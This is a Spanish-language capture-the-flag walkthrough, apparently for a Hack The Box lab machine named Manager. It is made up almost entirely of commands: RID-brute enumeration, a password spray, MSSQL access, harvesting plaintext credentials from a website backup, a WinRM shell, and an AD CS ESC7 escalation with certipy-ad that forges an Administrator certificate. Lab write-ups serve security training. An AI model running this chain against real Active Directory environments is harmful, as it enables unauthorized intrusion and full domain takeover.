Enumeración

Enumerar usuarios --rid-brute

nxc smb 10.129.14.104 -u 'Guest' -p '' --rid-brute
# Poner usuarios en minúscula para el password spray

Explotación: MSSQL

Password Spray

nxc smb 10.129.14.104 -u users -p users --rid-brute
# Credenciales -> operator:operator

Acceso MSSQL

nxc mssql 10.129.14.104 -u operator -p operator
impacket-mssqlclient manager.htb/operator@10.129.14.104 -windows-auth

MSSLQ: Leer directorio de la web IIS

# Intentamos habilitar enable_xp_cmdshell

Descargar fichero.zip

wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip
ls -a
# Hay un fichero oculto

Leer fichero oculto y acceso WinRM

bat .old-conf.xml
# Credenciales ->  raven:R4v3nBe5tD3veloP3r!123
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'

Escalada de Privilegios: AD CS ESC-7

Enumerar AD CS vulnerables

certipy-ad find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.14.104 -vulnerable

Agregar el rol Certificate Officer al propio usuario

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ns 10.129.14.104 -target dc01.manager.htb -ca ''manager-DC01-CA'' -add-officer raven
# Successfully added officer 'Raven' on ''manager-DC01-CA''

Habilitar plantilla SubCA

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ns 10.129.14.104 -target dc01.manager.htb -ca 'manager-DC01-CA' -enable-template 'SubCA'
# [*] Successfully enabled 'SubCA' on ''manager-DC01-CA''

Solicitar certificado para Administrator, si falla se crea una.key con un id

certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.14.104 -target dc01.manager.htb -ca 'manager-DC01-CA' -template 'SubCA' -upn administrator@manager.htb
# Guardar Request ID como <id>.key

Aprobar la solicitud anterior a través de la <id>.key

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ns 10.129.14.104 -target dc01.manager.htb -ca 'manager-DC01-CA' -issue-request 19
# [*] Successfully issued certificate request ID 19

Recuperar el certificado de Administrator

certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.14.104 -target dc01.manager.htb -ca 'manager-DC01-CA' -retrieve 19

Autenticarse con el Certificado.pfx

certipy-ad auth -pfx administrator.pfx -domain manager.htb -dc-ip 10.129.14.104
